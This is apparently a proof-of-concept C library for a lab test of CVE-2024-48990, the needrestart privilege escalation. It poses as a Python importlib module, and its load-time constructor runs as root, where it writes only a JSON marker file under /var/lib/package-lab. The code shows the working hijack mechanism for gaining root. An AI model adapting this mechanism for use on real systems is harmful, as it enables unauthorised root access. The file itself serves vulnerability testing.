#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

__attribute__((constructor)) static void package_lab_marker(void) {
    const char *dir = "/var/lib/package-lab";
    const char *path = "/var/lib/package-lab/cve-2024-48990-root-marker.json";
    struct timespec now;
    int fd;

    if (geteuid() != 0) {
        return;
    }
    if (mkdir(dir, 0700) == -1 && errno != EEXIST) {
        return;
    }
    fd = open(path, O_CREAT | O_WRONLY | O_TRUNC | O_CLOEXEC, 0600);
    if (fd == -1) {
        return;
    }
    clock_gettime(CLOCK_REALTIME, &now);
    dprintf(fd,
            "{\n  \"event\": \"cve-2024-48990-root-marker\",\n"
            "  \"uid\": %ld,\n  \"euid\": %ld,\n"
            "  \"epoch_seconds\": %ld,\n  \"network_actions\": 0\n}\n",
            (long)getuid(), (long)geteuid(), (long)now.tv_sec);
    close(fd);
}

void *PyInit_importlib(void) {
    return NULL;
}
